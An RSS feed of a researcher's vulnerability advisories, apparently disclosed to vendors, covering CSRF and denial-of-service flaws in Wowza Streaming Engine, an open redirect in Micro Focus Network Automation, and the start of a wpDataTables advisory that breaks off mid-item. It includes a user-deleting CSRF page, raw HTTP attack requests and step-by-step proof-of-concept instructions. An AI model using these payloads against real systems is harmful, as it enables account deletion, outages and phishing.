<?xml version="1.0" encoding="utf-8" standalone="yes" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
   <title>Advisories on The Tales of N4nj0</title>
   <link>https://n4nj0.github.io/advisories/</link>
   <description>Recent content in Advisories on The Tales of N4nj0</description>
   <generator>Hugo -- gohugo.io</generator>
   <language>en-us</language>
   <copyright>Copyright &amp;copy; 2021 - Veno Eivazian</copyright>
   <lastBuildDate>Wed, 06 Oct 2021 21:30:00 +0100</lastBuildDate>
   
       <atom:link href="https://n4nj0.github.io/advisories/index.xml" rel="self" type="application/rss+xml" />
   
   
     <item>
       <title>Wowza Streaming Engine - Multiple Vulnerabilities</title>
       <link>https://n4nj0.github.io/advisories/wowza-streaming-engine-i/</link>
       <pubDate>Wed, 06 Oct 2021 21:30:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/wowza-streaming-engine-i/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;I have found two security issues on Wowza Streaming Engine &amp;lt;= 4.8.11+5:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;1 - Cross-Site Request Forgery (CSRF) - CWE-352&lt;/strong&gt;: A remote attacker is able to delete a user account via the /enginemanager/server/user/delete.htm &lt;code&gt;userName&lt;/code&gt; parameter. The application does not implement a CSRF token for the GET request.&lt;br /&gt;&lt;strong&gt;2 - Uncontrolled Resource Consumption - CWE-400&lt;/strong&gt;: A remote attacker is able to exhaust filesystem resources via the /enginemanager/server/vhost/historical.jsdata &lt;code&gt;vhost&lt;/code&gt; parameter. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management.&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Product Line:&lt;/strong&gt; Wowza Streaming Engine&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerable Version:&lt;/strong&gt; 4.8.11+5&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Product Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.wowza.com/products/streaming-engine&#34;&gt;https://www.wowza.com/products/streaming-engine&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Wowza Streaming Engine (known as Wowza Media Server) is a unified streaming media server software developed by Wowza Media Systems based in Colorado, in the United States of America and used by many US government entities such as NASA, US Air force, Boeing, New York Police Department and many other clients around the world.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;1-cross-site-request-forgery-csrf-cwe-352&#34;&gt;&lt;strong&gt;1 - Cross-Site Request Forgery (CSRF) - CWE-352&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; A remote attacker is able to delete a user without the victim&amp;rsquo;s knowledge, by enticing an authenticated admin user to visit an attacker&amp;rsquo;s web page. The application does not implement a CSRF token for the GET request. An attacker can craft an HTML page with a forged request on /enginemanager/server/user/delete.htm URL and send it to the victim.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; None.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35491&#34;&gt;CVE-2021-35491&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-35491&#34;&gt;&lt;strong&gt;N/A&lt;/strong&gt; (N/A)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;An authenticated user that visits a crafted HTML page with a forged request can delete a user on Wowza Streaming Engine on behalf of an administrator.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://wse.local:8088/enginemanager/server/user/delete.htm&#34;&gt;http://wse.local:8088/enginemanager/server/user/delete.htm&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; userName&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;First, create a new user from &lt;strong&gt;Server&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Users&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Add User&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/11107100fccd4ef3e37eaa455c75998d.png&#34; alt=&#34;CSRF - User creation&#34; /&gt;&lt;/p&gt;&lt;p&gt;Then, &lt;strong&gt;Copy&lt;/strong&gt; the following HTML to a file served on another machine, in this case a local Kali Linux, in the file: &lt;code&gt;/var/www/html/csrf-delete-user.html&lt;/code&gt;&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;  &amp;lt;body&amp;gt;  &amp;lt;script&amp;gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&amp;lt;/script&amp;gt;    &amp;lt;form action=&amp;quot;http://wse.local:8088/enginemanager/server/user/delete.htm&amp;quot;&amp;gt;      &amp;lt;input type=&amp;quot;hidden&amp;quot; name=&amp;quot;userName&amp;quot; value=&amp;quot;pippo&amp;quot; /&amp;gt;      &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit request&amp;quot; /&amp;gt;    &amp;lt;/form&amp;gt;  &amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Enable the local web server on the attacker machine:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;sudo /etc/init.d/apache2 start&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;From an authenticated browser session to Wowza Streaming Engine with administrative privileges, open a new tab and go to the page &lt;a href=&#34;http://127.0.0.1/csrf-delete-user.html&#34;&gt;http://127.0.0.1/csrf-delete-user.html&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/c9083d8eb67a0bbc1380f4d443015070.png&#34; alt=&#34;CSRF - PoC HTML page&#34; /&gt;&lt;/p&gt;&lt;p&gt;Select &lt;strong&gt;Submit request&lt;/strong&gt;, to force the administrator to delete the selected user.&lt;br /&gt;The request will be sent to the web application, and the user will be deleted:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/78625fe99a5c87bef165c60c492a5948.png&#34; alt=&#34;CSRF - User deleted&#34; /&gt;&lt;/p&gt;&lt;p&gt;It was also found that the &lt;code&gt;wowzaSecurityToken&lt;/code&gt; HTTP parameter is not present in this GET request. In this case, the application accepts the request and processes it every time.&lt;br /&gt;This is not true in the case of user creation, where that parameter is present and correctly validated.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;By exploiting this issue, a remote attacker is able to delete every user on Wowza Streaming Engine on behalf of a regular platform administrator.&lt;/p&gt;&lt;h3 id=&#34;2-uncontrolled-resource-consumption-cwe-400&#34;&gt;&lt;strong&gt;2 - Uncontrolled Resource Consumption - CWE-400&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user that views Virtual Host Monitoring historical data is able to forge an HTTP request to view a non-existing virtual host. Each time a new virtual host is requested, a 280 KB file is created on the filesystem. By randomly choosing different virtual host names, a malicious attacker is able to exhaust filesystem resources, resulting in a denial of service (DoS) condition on the affected application.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; Valid user session with the privileges to view Virtual Host Monitoring on Wowza Streaming Engine web interface.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35492&#34;&gt;CVE-2021-35492&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-35492&#34;&gt;&lt;strong&gt;N/A&lt;/strong&gt; (N/A)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;A remote user, authenticated to the Wowza Streaming Engine web interface, through &lt;strong&gt;Virtual Host Monitoring&lt;/strong&gt; section, could exhaust filesystem resources, resulting in a denial of service (DoS) condition on an affected application. This vulnerability is due to the insufficient management of available filesystem resources. An attacker could exploit this vulnerability by requesting random virtual host historical data and exhausting available filesystem resources. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management. Manual intervention is required to free filesystem resources and return the application to an operational state.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://wse.local:8088/enginemanager/server/vhost/historical.jsdata&#34;&gt;http://wse.local:8088/enginemanager/server/vhost/historical.jsdata&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameters:&lt;/strong&gt; vhost&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;To exploit the vulnerability, intercept the browser session with a proxy like &lt;a href=&#34;https://portswigger.net/burp&#34;&gt;&lt;strong&gt;Burp Suite&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;Then, go to the &lt;strong&gt;Virtual Host Monitoring&lt;/strong&gt; section:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/77ac1d79a117b8d1f0922edaf04af168.png&#34; alt=&#34;DoS - Virtual Host Monitoring - Web Interface&#34; /&gt;&lt;/p&gt;&lt;p&gt;An HTTP request will be automatically performed to view the historical data of the default virtual host.&lt;br /&gt;The request on Burp Suite will be like the next screenshot.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/2090ff191739390815bd1a9ff9171c57.png&#34; alt=&#34;DoS - Regular HTTP request&#34; /&gt;&lt;/p&gt;&lt;p&gt;Every time virtual host monitoring data is requested, a new file is created or appended on the filesystem.&lt;br /&gt;By default, this is the starting condition on the folder &lt;code&gt;/usr/local/WowzaStreamingEngine-4.8.11+5/stats/&lt;/code&gt;:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/c185fd4210d6610f47b09d9335c97fe3.png&#34; alt=&#34;DoS - Filesystem on normal condition&#34; /&gt;&lt;/p&gt;&lt;p&gt;The attack can be performed using Burp Repeater, using the same request captured with the proxy, changing only the &lt;code&gt;vhost&lt;/code&gt; parameter value. The response will be &lt;strong&gt;HTTP 200 OK&lt;/strong&gt;:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/8ecb268be9d9f1a32bad417f729dfa7c.png&#34; alt=&#34;DoS - New virtual host HTTP request&#34; /&gt;&lt;/p&gt;&lt;p&gt;Alternatively, the same can be achieved with the following payload:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;GET /enginemanager/server/vhost/historical.jsdata?vhost=_defaultVHost_pippo_&amp;amp;periodStart=2021-06-03T13%3A47%3A44%2B02%3A00&amp;amp;periodEnd=2021-06-03T14%3A47%3A44%2B02%3A00&amp;amp;_=1622724285834 HTTP/1.1Host: wse.local:8088User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: closeReferer: http://wse.local:8088/enginemanager/Home.htmCookie: JSESSIONID=E1EC2C1050D74EB0E4DA9474789E8F5E; lastMangerHost=http%3A//127.0.0.1%3A8087; showRightRail=true; DoNotShowFTU=false; lastTab=Basic&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On the filesystem side, a new file of 280 KB will be created, as depicted by the following screenshot:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/46b6a90a00b6794f46724d8d90a636df.png&#34; alt=&#34;DoS - New virtual host file on the filesystem&#34; /&gt;&lt;/p&gt;&lt;p&gt;To massively exploit this condition, multiple requests with different &lt;code&gt;vhost&lt;/code&gt; values have to be sent.&lt;br /&gt;To send those requests reliably, the browser session has to be left active.&lt;br /&gt;Session timeout can be prevented by installing a browser plugin like &lt;a href=&#34;https://addons.mozilla.org/en-US/firefox/addon/tab-reloader/&#34;&gt;Tab Reloader&lt;/a&gt; and configure it to refresh the tab every 1 minute, like the following example:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/ae417f01c15f4d4c3d130bfa2aef85fa.png&#34; alt=&#34;DoS - Session timeout prevention - Tab Reloader&#34; /&gt;&lt;/p&gt;&lt;p&gt;Then it is possible to create a custom script to randomize the vhost parameter to a new value to be sent every time.&lt;br /&gt;I have released a Denial of Service tool on my &lt;a href=&#34;https://github.com/N4nj0/CVE-2021-35492&#34;&gt;GitHub repo&lt;/a&gt;.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;./dos-exploit-wse.py&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When executing such tool, it is possible to exhaust the filesystem by creating &lt;strong&gt;5.5 GB&lt;/strong&gt; of files every &lt;strong&gt;30 minutes&lt;/strong&gt;.&lt;br /&gt;The effect can be summarized on the following screenshot, which depicts multiple files created on the filesystem and the difference of the &lt;strong&gt;stats&lt;/strong&gt; directory size after 30 minutes of the tool execution:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/12a45ff9bbc0902ed9db6238e8d1a270.png&#34; alt=&#34;DoS - DoS exploit effect&#34; /&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;An attacker could exploit this vulnerability to exhausting available filesystem resources. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management. Manual intervention is required to free filesystem resources and return the device to an operational state.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;08/06/2020&lt;/strong&gt;: First disclosure to Wowza via &lt;a href=&#34;mailto:info@wowza.com&#34;&gt;info@wowza.com&lt;/a&gt;.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;20/07/2020&lt;/strong&gt;: Wowza Streaming Engine™ 4.8.14+9 build 20210719152831 is released. See the &lt;a href=&#34;https://www.wowza.com/docs/wowza-streaming-engine-4-8-14-release-notes&#34;&gt;Release Notes&lt;/a&gt;.&lt;br /&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;05/10/2021&lt;/strong&gt;: MITRE published the 2 CVEs.&lt;br /&gt;&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>Micro Focus Network Automation - Open Redirect via Origin Header</title>
       <link>https://n4nj0.github.io/advisories/micro-focus-network-automation-i/</link>
       <pubDate>Wed, 15 Sep 2021 10:15:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/micro-focus-network-automation-i/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;I have found an unauthenticated Open Redirect via Origin Header on Micro Focus Network Automation versions 10.4x, 10.5x, 2018.05, 2018.11, 2019.05, 2020.02, 2020.08, 2020.11, 2021.05.&lt;/p&gt;&lt;h2 id=&#34;product-information&#34;&gt;Product Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Organization Name:&lt;/strong&gt; Micro Focus&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Affected Versions:&lt;/strong&gt; 10.4x, 10.5x, 2018.05, 2018.11, 2019.05, 2020.02, 2020.08, 2020.11, 2021.05.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.microfocus.com&#34;&gt;https://www.microfocus.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Email:&lt;/strong&gt; &lt;a href=&#34;security@microfocus.com&#34;&gt;security@microfocus.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Disclosure Info Web Page:&lt;/strong&gt; &lt;a href=&#34;https://www.microfocus.com/support-and-services/report-security/&#34;&gt;https://www.microfocus.com/support-and-services/report-security/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Micro Focus Network Automation is a commercial software tool that automates network configuration and change management.&lt;br /&gt;During a security audit of the product, I have found this issue.&lt;br /&gt;Probably due to the number of impacted versions, this issue took the vendor 7 months to resolve.&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;url-redirection-to-untrusted-site-open-redirect-cwe-601&#34;&gt;&lt;strong&gt;URL Redirection to Untrusted Site (&amp;lsquo;Open Redirect&amp;rsquo;) - CWE-601&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; The Host HTTP parameter could cause the web application to redirect to the specified URL, when the requested endpoint is &amp;lsquo;/device.save.do&amp;rsquo;. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; None.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-38123&#34;&gt;CVE-2021-38123&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-38123&#34;&gt;&lt;strong&gt;6.1&lt;/strong&gt; (Medium)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The application presents an Open Redirect on the Host parameter, when the /device.save.do endpoint is requested via an HTTP POST request.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;https://hostname/device.save.do&#34;&gt;https://hostname/device.save.do&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; Host&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The HTTP request is the following:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;POST /device.save.do HTTP/1.1Host: this.is.my.domain.evil.netCache-Control: no-cacheUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateOrigin: https://hostnameConnection: closeReferer: https://hostname/device.edit.do?deviceID=201Upgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedContent-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;An attacker can send a link containing JavaScript code that allows a user who runs the code to be automatically redirected to a domain owned by the attacker himself.&lt;br /&gt;The redirect is performed via the HTTP &lt;code&gt;Location&lt;/code&gt; response header.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/f84b2697402f7598e5e506850d2ed080.png&#34; alt=&#34;Open Redirect (1)&#34; /&gt;&lt;/p&gt;&lt;p&gt;The victim is thus redirected to a malicious domain:&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/8f4aef5b444d295e4761e56a879cfb6d.png&#34; alt=&#34;Open Redirect (2)&#34; /&gt;&lt;/p&gt;&lt;p&gt;To perform this attack, the user does not need to be authenticated to the target application.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Security Impact&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behavior can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.&lt;/p&gt;&lt;h2 id=&#34;timeline&#34;&gt;Timeline&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;18/02/2021&lt;/strong&gt;: First disclosure via e-mail to &lt;a href=&#34;security@microfocus.com&#34;&gt;security@microfocus.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Several times in the middle&lt;/strong&gt;: Ping requests for status update (We&amp;rsquo;ve heard of a man, who heard another man&amp;hellip;)&lt;/li&gt;&lt;li&gt;&lt;strong&gt;07/09/2021&lt;/strong&gt;: Published CVEs on MITRE.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;14/09/2021&lt;/strong&gt;: NVD scored &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-38123&#34;&gt;CVE-2021-38123&lt;/a&gt; as &lt;strong&gt;6.1&lt;/strong&gt; (Medium).&lt;/li&gt;&lt;/ul&gt;</description>
     </item>
   
     <item>
       <title>WordPress Plugin wpDataTables - Multiple Vulnerabilities</title>
       <link>https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-ii/</link>
       <pubDate>Tue, 16 Mar 2021 18:09:00 +0100</pubDate>
       
       <guid>https://n4nj0.github.io/advisories/wordpress-plugin-wpdatatables-ii/</guid>
       <description>&lt;h2 id=&#34;tl-dr&#34;&gt;TL;DR&lt;/h2&gt;&lt;p&gt;Me and my colleague Massimiliano Ferraresi have found four security issues:&lt;/p&gt;&lt;p&gt;&lt;strong&gt;1 - Improper Access Control&lt;/strong&gt;: An authenticated user that visits the page where the table is published can tamper the parameters to access the data of another user that are present in the same table by taking over the user permissions on the table through &lt;strong&gt;formdata[wdt_ID]&lt;/strong&gt; parameter.&lt;br /&gt;&lt;strong&gt;2 - Improper Access Control&lt;/strong&gt;: An authenticated user that visits the page where the table is published can tamper the parameters to delete the data of another user that are present in the same table through &lt;strong&gt;id_key&lt;/strong&gt; and &lt;strong&gt;id_val&lt;/strong&gt; parameters.&lt;br /&gt;&lt;strong&gt;3 - SQL Injection&lt;/strong&gt;: An authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter &lt;strong&gt;start&lt;/strong&gt;.&lt;br /&gt;&lt;strong&gt;4 - SQL Injection&lt;/strong&gt;: An authenticated user on the WordPress interface that visits the page where the tables are listed can perform a SQL injection attack in the table search parameter &lt;strong&gt;length&lt;/strong&gt;.&lt;/p&gt;&lt;h2 id=&#34;plugin-information&#34;&gt;Plugin Information&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Organization Name:&lt;/strong&gt; TMS&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Web Page:&lt;/strong&gt; &lt;a href=&#34;https://tms-outsource.com&#34;&gt;https://tms-outsource.com&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Vulnerability Disclosure Info or Technical Support Web Page:&lt;/strong&gt; &lt;a href=&#34;https://tmsplugins.ticksy.com/submit/#100004195&#34;&gt;https://tmsplugins.ticksy.com/submit/#100004195&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin name:&lt;/strong&gt; wpDataTables&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin version:&lt;/strong&gt; &amp;lt;= 3.4.1&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Plugin Web Page:&lt;/strong&gt; &lt;a href=&#34;https://wpdatatables.com&#34;&gt;https://wpdatatables.com&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;wpDataTables is a best-selling WordPress table plugin which makes very easy to work with tables, charts and data management. It is currently used by 40,000+ companies and individuals in financial, scientific, statistical, commercial and other sectors.&lt;/p&gt;&lt;p&gt;During another security auditing of the product, we have found four security issues. The first two are broken access controls on accessing and deleting data on the same table. Also, the other two are Blind SQL Injections on 2 different parameters.&lt;/p&gt;&lt;p&gt;The fix was developed with the release 3.4.2, 16 days after our vulnerability disclosure. This time they didn&amp;rsquo;t mention us, maybe we have created some troubles for them.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;For all folks of wpDataTables Team&lt;/strong&gt;: No problem for us, the important thing is to collaborate and make the products more secure as possible. See you soon 😘&lt;/p&gt;&lt;h2 id=&#34;vulnerability-details&#34;&gt;Vulnerability Details&lt;/h2&gt;&lt;h3 id=&#34;1-software-does-not-restrict-or-incorrectly-restricts-access-to-a-resource-from-an-unauthorized-actor-cwe-284&#34;&gt;&lt;strong&gt;1 - Software does not restrict or incorrectly restricts access to a resource from an unauthorized actor - CWE-284&lt;/strong&gt;&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Summary:&lt;/strong&gt; An authenticated user can tamper HTTP parameters to access to the data on the table of another user by taking over the user permissions on the table.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Prerequisites:&lt;/strong&gt; A simple table with the settings of &lt;em&gt;Enable of front-end editing&lt;/em&gt; and &lt;em&gt;Limiting editing to own data only&lt;/em&gt; needs to be created and published in a page on WordPress.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;CVE and CVSS Score:&lt;/strong&gt; &lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24197&#34;&gt;CVE-2021-24197&lt;/a&gt; | &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2021-24197&#34;&gt;&lt;strong&gt;8.1&lt;/strong&gt; (High)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;Step-by-step instructions and PoC&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;First, it is necessary to create a simple table with three columns and two or more rows. Then, the table can be published on a page with the following settings:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Allow front-end editing&lt;/li&gt;&lt;li&gt;Limit editing to own data only&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;An authenticated user that visits the page where the table is published can tamper the parameters to access the data of another user that are present in the same table through &lt;strong&gt;formdata[wdt_ID]&lt;/strong&gt; parameter.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Affected Endpoints&lt;/strong&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;URL:&lt;/strong&gt; &lt;a href=&#34;http://hostname/portal/wp-admin/admin-ajax.php&#34;&gt;http://hostname/portal/wp-admin/admin-ajax.php&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;strong&gt;HTTP Parameter:&lt;/strong&gt; formdata[wdt_ID]&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Below are the evidences with the vulnerability details and the payloads used.&lt;/p&gt;&lt;p&gt;The starting point is a standard installation of WordPress version 5.6 (the latest), with a fresh install of the wpDataTables plugin, without further configuration. After the plugin installation, it is necessary to create a simple table used for the vulnerability PoC.&lt;/p&gt;&lt;p&gt;To create the table, login to WordPress as &lt;strong&gt;admin&lt;/strong&gt;.&lt;br /&gt;Under &lt;strong&gt;wpDataTables&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Create a Table&lt;/strong&gt;, select &lt;strong&gt;Create a data table manually&lt;/strong&gt; and then &lt;strong&gt;Next&lt;/strong&gt;.&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/18057ef8f7a7d086bfbe9ee37ac9e46a.png&#34; alt=&#34;Creation of the table&#34; /&gt;&lt;/p&gt;&lt;p&gt;The table can have simple data, like the following:* &lt;strong&gt;Table name:&lt;/strong&gt; products* &lt;strong&gt;Number of columns:&lt;/strong&gt; 3* &lt;strong&gt;Column 1:&lt;/strong&gt;  * &lt;strong&gt;Name:&lt;/strong&gt; name  * &lt;strong&gt;Type:&lt;/strong&gt; One line string* &lt;strong&gt;Column 2:&lt;/strong&gt;  * &lt;strong&gt;Name:&lt;/strong&gt; price  * &lt;strong&gt;Type:&lt;/strong&gt; Float* &lt;strong&gt;Column 3&lt;/strong&gt; (&lt;strong&gt;The User ID column is responsible to manage the user’s authorizations&lt;/strong&gt;);  * &lt;strong&gt;Name:&lt;/strong&gt; User ID  * &lt;strong&gt;Type:&lt;/strong&gt; Integer&lt;/p&gt;&lt;p&gt;Add the table data via the web interface:&lt;/p&gt;&lt;p&gt;Confirm the table with &lt;strong&gt;Create the table&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Open in Standard view&lt;/strong&gt;&lt;br /&gt;Insert three rows with some data, in the userid column is necessary to insert the ID of WordPress users.For PoC we registered two users &lt;strong&gt;max (id=1)&lt;/strong&gt; and &lt;strong&gt;test (id=2)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&#34;https://n4nj0.github.io/images/7df23ef50e2a15feee5a28014d30e48b.png&#34; alt=&#34;Insert value&#34; /&gt;Under &lt;strong&gt;Editing&lt;/strong&gt; click on  